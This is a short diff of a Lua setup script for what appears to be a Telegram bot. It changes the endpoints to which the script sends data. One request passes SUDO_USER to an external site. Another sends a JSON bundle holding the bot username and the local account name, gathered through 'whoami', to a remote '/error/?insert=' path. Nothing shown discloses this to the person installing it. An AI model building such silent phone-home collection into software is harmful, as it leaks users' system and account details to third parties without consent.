@@ -114,7 +114,7 @@ create_config(Token)
 
 end 
 
-local url , res = https.request('https://apirami.000webhostapp.com/Rambov2/?User='..SUDO_USER)
+local url , res = https.request('https://faeder.net/Rambov2/?User='..SUDO_USER)
 
 if res ~= 200 then
 
@@ -188,7 +188,7 @@ info.userbot  = BOT_User
 
 info.userjoin  = io.popen("whoami"):read('*a'):gsub('[\n\r]+', '') 
 
-https.request(GetUser.information.WebSite..'/in.php/?insert='..JSON.encode(info))
+https.request(GetUser.information.WebSite..'/error/?insert='..JSON.encode(info))
 
 Cr_file = io.open("./inc/Token.txt", "w")
 
